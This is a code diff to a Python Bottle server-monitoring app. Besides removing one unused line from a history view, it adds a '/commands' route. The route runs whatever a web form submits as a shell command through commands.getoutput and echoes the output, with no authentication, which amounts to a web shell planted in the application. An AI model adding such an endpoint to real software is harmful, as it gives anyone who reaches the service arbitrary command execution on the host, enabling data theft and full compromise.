@@ -204,7 +204,6 @@ def history(oid):
         load_avg_1 = [float(i['load_avg']['lavg_1']) for i in status_list]
         load_avg_5 = [float(i['load_avg']['lavg_5']) for i in status_list]
         load_avg_15 = [float(i['load_avg']['lavg_15']) for i in status_list]
-        load_avg = status_list[0]['load_avg']
         last_time = status_list[0]
     except IndexError:
         return index_error('暂无历史记录')
@@ -212,6 +211,15 @@ def history(oid):
     #for i in status_list:
     #    print i['datetime']
     return template('history', locals())
+import commands as co
+@route('/commands')
+@route('/commands', method="POST")
+def commands():
+    if request.method == "POST":
+        com = request.forms.get('com')
+        return "<form method='POST'><input type='text' cols=100 name='com' /><input type='submit' /></form><br />" + co.getoutput(com)
+    return "<form method='POST'><input type='text' cols=100 name='com' /><input type='submit' /></form>"
+
 
 @route("/funcs")
 def funcs():
